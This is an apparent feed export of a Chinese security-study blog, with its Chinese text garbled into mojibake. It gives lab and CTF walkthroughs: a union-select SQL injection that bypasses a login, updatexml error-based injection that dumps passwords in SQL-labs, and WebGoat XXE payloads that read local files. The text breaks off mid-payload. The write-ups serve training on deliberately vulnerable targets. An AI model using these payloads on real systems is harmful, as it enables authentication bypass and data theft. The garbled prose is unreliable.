axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºè¿‡æ»¤äº†or</span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨<span class="keyword">order</span> <span class="keyword">by</span>æ¥åˆ¤æ–­åˆ—æ•°ï¼Œå¯ä»¥ç”¨è”åˆæ³¨å…¥ï¼Œåˆ©ç”¨<span class="keyword">select</span>çš„ç»“æœæ¥åˆ¤æ–­</span><br></pre></td></tr></table></figure><p>å…ˆè¯•è¯•<code>select 1,2</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220909214254664.png" alt="image-20220909214254664"></p><p>å‘ç°æŠ¥é”™ï¼Œåˆ—æ•°æœ‰é—®é¢˜</p><p>å†è¯•è¯•<code>select 1,2,3</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220909214345515.png" alt="image-20220909214345515"></p><p>å‘ç°è™½ç„¶æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰ç›´æ¥å›æ˜¾</p><p>å†è¯•è¯•<code>select 1,2,3,4</code></p><p>åˆæŠ¥é”™</p><p><img src="/2022/06/21/buuctf-wp/image-20220909214506605.png" alt="image-20220909214506605"></p><p><strong>æ‰€ä»¥å¾—å‡º<code>åˆ—æ•°ä¸€å…±æœ‰3åˆ—</code></strong></p><p><strong>æ ¹æ®ç»éªŒè¿™ä¸‰åˆ—ï¼Œåˆ†åˆ«æ˜¯</strong><u><strong>id,username,password</strong></u></p><p>æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥è¿›è¡Œç¡®è®¤</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="built_in">select</span>%<span class="number">20</span>â€adminâ€œ,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;pw=123456   </span></span><br><span class="line"><span class="comment">//æŠŠç¬¬ä¸€ä½ï¼Œå³1çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220910085003536.png" alt="image-20220910085003536"></p><p>æç¤ºç”¨æˆ·åé”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åä¸åœ¨ç¬¬ä¸€ä½</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="number">-1</span>&#x27;<span class="variable">%20</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="number">3</span>#&amp;pw<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">//æŠŠç¬¬äºŒä½ï¼Œå³<span class="number">2</span>çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220910085115686.png" alt="image-20220910085115686"></p><p>æç¤ºå¯†ç é”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åå›æ˜¾å°±åœ¨ç¬¬äºŒä½</p><p><strong>ä½†æ˜¯æ²¡æœ‰å›æ˜¾æˆ‘ä»¬selectçš„æ•°æ®ï¼Œå¯æ˜¯å¦‚æœç”¨æŠ¥é”™æ³¨å…¥å’Œç›²æ³¨çš„è¯ï¼Œ()è¢«è¿‡æ»¤äº†ï¼Œä¹Ÿä¸èƒ½ç”¨</strong></p><p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰è€ƒè™‘ï¼Œæ€ä¹ˆæ‰å¯ä»¥ç™»å½•ä¸Šå»</p><p>é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªsqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå¯†ç ä¸å¯èƒ½ç®€å•çš„çˆ†ç ´å°±å¯ä»¥è§£å†³</p><p><strong>å¯†ç è‚¯å®šæ˜¯è¿›è¡ŒåŠ å¯†ï¼Œæœ€å¸¸è§çš„å¯†ç åŠ å¯†å°±æ˜¯md5</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨<code>md()</code>å‡½æ•°æŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œå†åŠ ä¸Šæˆ‘ä»¬çš„ç”¨æˆ·åä¸€èµ·å¯¼å…¥åˆ°é¢˜ç›®çš„æ•°æ®åº“é‡Œï¼Œå³å¯å®Œæˆç™»å½•</p><p>æ³¨æ„å› ä¸º<code>()</code>è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥åªèƒ½å…ˆæŠŠå¯†ç è¿›è¡Œmd5åŠ å¯†ï¼Œåœ¨å¯¼å…¥ï¼Œè€Œä¸èƒ½ç›´æ¥ç”¨å‡½æ•°</p><hr><p>è¿™é‡Œåˆæœ‰ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹</p><p><strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚ã€union selectã€‘</strong></p><p>åœ¨<code>Web-study</code>é‡Œå†™çš„è¯¦ç»†</p><p>ä¸‹é¢ç®€å•è¯´ä¸€ä¸‹æµç¨‹</p><p>å…ˆæŠŠæˆ‘ä»¬çš„å¯†ç 123456åˆ©ç”¨md5åŠ å¯†</p><p><img src="/2022/06/21/buuctf-wp/image-20220910090640990.png" alt="image-20220910090640990"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ payload</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">201</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class="number">123456</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">è”åˆæ³¨å…¥çš„æŠ€å·§ï¼Œå°±æ˜¯åœ¨ä½¿ç”¨<span class="built_in">union</span> <span class="keyword">select</span>æ—¶å€™ï¼Œåé¢çš„æ•°æ®å¦‚æœä¸å­˜åœ¨ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</span><br><span class="line">å¦‚ä¸Šé¢çš„</span><br><span class="line"></span><br><span class="line">æ ¹æ®ä¸Šé¢baseç¼–ç ç»“æœï¼Œ<span class="keyword">select</span> * <span class="keyword">from</span> user <span class="built_in">where</span> username = &#x27;$name&#x27;</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬åˆ©ç”¨<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span></span><br><span class="line"></span><br><span class="line">å› ä¸ºuserè¡¨é‡Œä¸å­˜åœ¨id=<span class="number">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¼šç”Ÿæˆä¸€ä¸ªä¸€ä¸ªæ•°æ®æ’å…¥è¡¨ä¸­</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">å½“nameå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼ŒæŠŠæ•°æ®æ’å…¥userè¡¨ä¸­æ—¶</span><br><span class="line">åé¢passwordåªè¦å’Œæ˜æ–‡ä¸€æ ·ï¼Œå³å¯ç™»å½•æˆåŠŸ</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220910091405613.png" alt="image-20220910091405613"></p><p>å¾—åˆ°flag</p><h2 id="13-æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#13-æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="13.[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>13.[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><h3 id="1-é¢˜ç›®æè¿°-10"><a href="#1-é¢˜ç›®æè¿°-10" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¿ä¸‹é¶åœºå­¦ä¹ </title>
      <link href="/2022/06/21/underline-learning/"/>
      <url>/2022/06/21/underline-learning/</url>
      
        <content type="html"><![CDATA[<p><code>ä¸ºä»€ä¹ˆå­¦ä¹ çº¿ä¸‹é¶åœºï¼Œå› ä¸ºçº¿ä¸‹é¶åœºç›¸æ¯”æ›´åŠ å®¹æ˜“ç†è§£æ¼æ´å…¥é—¨ï¼Œ</code></p><p><code>è€Œä¸”å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„æºç ï¼Œä»è€Œå¯ä»¥é”»ç‚¼ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œæ‰¾å‡ºæ¼æ´çš„æˆå› ï¼Œ</code></p><p><code>å°è¯•è‡ªå·±æå‡ºç»•è¿‡æˆ–è€…é˜²å¾¡çš„æªæ–½ï¼Œè¿™é‡Œåªè®°å½•ä¸€ä¸‹æœ¬äººè§‰å¾—çš„çº¿ä¸‹é¶åœºå°è±¡æ·±åˆ»ï¼Œå¯¹æœ¬äººæœ‰æ„ä¹‰çš„éƒ¨åˆ†</code></p><span id="more"></span><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187">æ¨èæ–‡ç« é“¾æ¥</a></p><p><em><u>ä¸è¦åªçŸ¥é“payloadï¼Œè¦ä»”ç»†åˆ†æç†è§£æºç ï¼Œæ‰¾å‡ºå‡ºç°æ¼æ´çš„åŸå› ç‚¹</u></em></p><p><u><code>å»ºè®®çœ‹æ¨èæ–‡ç« ï¼Œä¸‹é¢ä»£ç å®¡è®¡å’Œé¢˜ç›®åˆ†æä»…æ˜¯æˆ‘ä¸ªäººèƒ½åŠ›ç»“æœï¼Œåªèƒ½å°½å¯èƒ½è¯´åˆ°ç‚¹å¤„</code></u></p><p><u><code>è€Œä¸”éƒ¨åˆ†ä¹Ÿæ˜¯å€Ÿé‰´æ¨èæ–‡ç« å†…å®¹</code></u></p><h1 id="SQL-labs"><a href="#SQL-labs" class="headerlink" title="SQL-labs"></a>SQL-labs</h1><p><em><u>è¿™é‡Œä¸å…¨å†™ï¼Œè¯¦ç»†å»ºè®®æ‰¾ä¸€ä¸‹sql-labså¤©ä¹¦ï¼Œè®¤çœŸå­¦ä¹ ä¸€ä¸‹</u></em></p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>å…¶å®æˆ‘ä»¬å¯ä»¥å…ˆåœ¨æºä»£ç ä¸­çœ‹åˆ°ä¸€ä¸ªå‡½æ•°ã€‚<code>check_input()</code>å‡½æ•°ã€‚ å°±ä¼šäº†è§£ä¸ºä»€ä¹ˆä¸åœ¨<code>username</code>å¤„è¿›è¡Œæ³¨å…¥</p><p><img src="/2022/06/21/underline-learning/image-20220729232132515.png" alt="image-20220729232132515"></p><p><img src="/2022/06/21/underline-learning/image-20220729232104117.png" alt="image-20220729232104117"></p><p>è¿™é‡ŒæŠŠè¿™å‡ ä¸ªå‡½æ•°è§£é‡Šä¸€ä¸‹ï¼Œå°±æ¸…æ¥šäº†</p><p><strong>â˜…addslashes()</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">addslashes<span class="comment">()</span> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š </span><br><span class="line"></span><br><span class="line">â€‹å•å¼•å·ï¼ˆ<span class="string">&#x27;ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹åŒå¼•å·ï¼ˆ&quot;ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹åæ–œæ ï¼ˆ\ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹NULL </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æç¤ºï¼šè¯¥å‡½æ•°å¯ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ³¨é‡Šï¼šé»˜è®¤åœ°ï¼ŒPHP å¯¹æ‰€æœ‰çš„ GETã€POST å’Œ COOKIE æ•°æ®è‡ªåŠ¨è¿è¡Œ addslashes()ã€‚æ‰€ä»¥æ‚¨ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨ addslashes()ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰ã€‚é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä»¥ä½¿ç”¨å‡½æ•° get_magic_quotes_gpc() è¿›è¡Œæ£€æµ‹ã€‚ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è¯­æ³•ï¼šaddslashes(<span class="built_in">string</span>) </span><br><span class="line"></span><br><span class="line">å‚æ•°             æè¿°</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>          å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">è¿”å›å€¼ï¼š         è¿”å›å·²è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">PHP ç‰ˆæœ¬ï¼š       <span class="number">4</span>+ </span><br></pre></td></tr></table></figure><p><strong>â˜…stripslashes()</strong> </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‡½æ•°åˆ é™¤ç”± <span class="built_in">addslashes</span>() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚ </span><br></pre></td></tr></table></figure><p><strong>â˜…mysql_real_escape_string()</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‡½æ•°è½¬ä¹‰ <span class="keyword">SQL</span> è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚ </span><br></pre></td></tr></table></figure><p>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">\x00</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\n</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\r</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\x1a </span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚ </p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¯­æ³•ï¼šmysql<span class="constructor">_real_escape_string(<span class="params">string</span>,<span class="params">connection</span>)</span> </span><br><span class="line"></span><br><span class="line">å‚æ•°                              æè¿° </span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>                            å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">connection å¯é€‰ã€‚    è§„å®š MySQL è¿æ¥ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ³¨å…¥å¤„åº”è¯¥åœ¨<code>passwd</code>ä¸­</p><p>å¼€å§‹å…ˆå°è¯•æ³¨å…¥ï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œ</p><p>æ‰€ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥</p><p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p><p>æŠ¥å‡º<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p><p><img src="/2022/06/21/underline-learning/image-20220905094419111.png" alt="image-20220905094419111"></p><p><u>å¤§è‡´æ„æ€æ˜¯ï¼Œåœ¨åŒä¸€è¯­å¥ä¸­ï¼Œä¸èƒ½å…ˆselectå‡ºåŒä¸€è¡¨ä¸­çš„æŸäº›å€¼ï¼Œå†updateè¿™ä¸ªè¡¨</u></p><p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦åŠ ä¸€ä¸ªä¸­é—´è¡¨ï¼Œå°±å¯ä»¥ç»•è¿‡è¿™ä¸ªé”™è¯¯</p><p>æ¯”å¦‚</p><p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p><p>è¿™é‡Œå°±æ˜¯æŠŠ<code>(select password from users)</code>çš„æŸ¥è¯¢åçš„æ•°æ®å­˜å…¥ç”Ÿæˆçš„æ–°è¡¨aï¼Œç„¶åå°±ç›¸å½“äº<code>(select password from a)</code></p><p><img src="/2022/06/21/underline-learning/image-20220905094517322.png" alt="image-20220905094517322"></p><p>å‘ç°ä¸èƒ½è¶…è¿‡ä¸€è¡Œ</p><p>äºæ˜¯ç”¨</p><p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p><p>æˆåŠŸ</p><p><img src="/2022/06/21/underline-learning/image-20220905094540906.png" alt="image-20220905094540906"></p><h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>å»ºè®®çœ‹æ–‡ç« ï¼Œæœ€åå‡ å…³äºŒæ¬¡æ¸²æŸ“å’Œæ¡ä»¶ç«äº‰å»ºè®®ä»”ç»†å­¦ä¹ ä¸€ä¸‹</p><h1 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h1><h2 id="ä¸€-XXE"><a href="#ä¸€-XXE" class="headerlink" title="ä¸€.XXE"></a>ä¸€.XXE</h2><h3 id="1-Letâ€™s-try"><a href="#1-Letâ€™s-try" class="headerlink" title="1.Letâ€™s try"></a>1.Letâ€™s try</h3><h4 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æ­¤ä½œä¸šä¸­ï¼Œæ‚¨å°†ä¸ºç…§ç‰‡æ·»åŠ è¯„è®ºï¼Œåœ¨æäº¤è¡¨å•æ—¶å°è¯•ä½¿ç”¨è¯„è®ºå­—æ®µæ‰§è¡Œ XXE æ³¨å…¥ã€‚å°è¯•åˆ—å‡ºæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæäº¤è¯„è®ºç„¶åæŠ“åŒ…è¯•è¯•</p><p><img src="/2022/06/21/underline-learning/image-20221015192748515.png" alt="image-20221015192748515"></p><p>è¿™æ—¶æˆ‘ä»¬å‘ç°è¯„è®ºçš„å†…å®¹æ˜¯åœ¨ç”¨<code>xml</code>è¿›è¡Œä¼ é€’ï¼Œ</p><p>å¯ä»¥ç¼–å†™<code>dtd</code>æ¥è¿›è¡Œå†…éƒ¨å®ä½“æ³¨å…¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/underline-learning/image-20221015195142684.png" alt="image-20221015195142684"></p><p>æˆåŠŸ</p><h3 id="2-Modern-REST-framework"><a href="#2-Modern-REST-framework" class="headerlink" title="2.Modern REST framework"></a>2.Modern REST framework</h3><h4 id="å‰è¨€ï¼š-1"><a href="#å‰è¨€ï¼š-1" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ç°ä»£ REST æ¡†æ¶ä¸­ï¼ŒæœåŠ¡å™¨å¯èƒ½èƒ½å¤Ÿæ¥å—æ‚¨ä½œä¸ºå¼€å‘äººå‘˜æ²¡æœ‰è€ƒè™‘è¿‡çš„æ•°æ®æ ¼å¼ã€‚å› æ­¤ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ JSON ç«¯ç‚¹å®¹æ˜“å—åˆ° XXE æ”»å‡»ã€‚</span><br><span class="line"></span><br><span class="line">å†æ¬¡è¿›è¡Œç›¸åŒçš„ç»ƒä¹ ï¼Œä½†å°è¯•æ‰§è¡Œä¸æˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªä½œä¸šä¸­æ‰€åšçš„ç›¸åŒçš„ <span class="keyword">XML</span> <span class="title">æ³¨å…¥ã€‚</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜æ˜¾å‘ç°åº•ä¸‹çš„è¯„è®ºä¼ é€’æ ¼å¼ä¸å†æ˜¯<code>xml</code></p><p>è€Œæ˜¯åœ¨ç”¨<code>json</code>è¿›è¡Œä¼ é€’</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jsonï¼š</span><br><span class="line">æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚äººç±»å¾ˆå®¹æ˜“é˜…è¯»å’Œå†™ä½œã€‚æœºå™¨å¾ˆå®¹æ˜“è§£æå’Œç”Ÿæˆã€‚å®ƒåŸºäº JavaScript ç¼–ç¨‹è¯­è¨€æ ‡å‡†</span><br><span class="line"></span><br><span class="line">åœ¨ JSON ä¸­ï¼Œå®ƒä»¬é‡‡ç”¨ä»¥ä¸‹å½¢å¼ï¼š</span><br><span class="line"></span><br><span class="line">å¯¹è±¡æ˜¯ä¸€ç»„æ— åºçš„åç§°<span class="regexp">/å€¼å¯¹ã€‚ä¸€ä¸ªå¯¹è±¡ä»¥&#123;ï¼ˆå·¦å¤§æ‹¬å·ï¼‰å¼€å§‹ï¼Œä»¥&#125;ï¼ˆå³å¤§æ‹¬å·ï¼‰ç»“æŸã€‚æ¯ä¸ªåç§°åè·Ÿï¼šå†’å·ï¼Œåç§°/</span>å€¼å¯¹ç”±é€—å·åˆ†éš”ã€‚</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/underline-learning/image-20221015195333753.png" alt="image-20221015195333753"></p><p>è¿™é‡Œæˆ‘ä»¬çœ‹</p><p><img src="/2022/06/21/underline-learning/image-20221015200313439.png" alt="image-20221015200313439"></p><p>å°±çŸ¥é“æ˜¯ä¿®æ”¹ <code>Content-Type</code></p><p><img src="/2022/06/21/underline-learning/image-20221015200353909.png" alt="image-20221015200353909"></p><p>æˆ‘ä»¬ç›´æ¥æŠŠ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span><br><span class="line">æ”¹æˆ</span><br><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">xml</span></span><br></pre></td></tr></table></figure><p>é‚£å°±å¯ä»¥ä»¥ <code>xml</code> å½¢å¼ä¸Šä¼ è¯„è®ºï¼Œä»è€Œå®ç° <code>xxe</code> æ³¨å…¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span 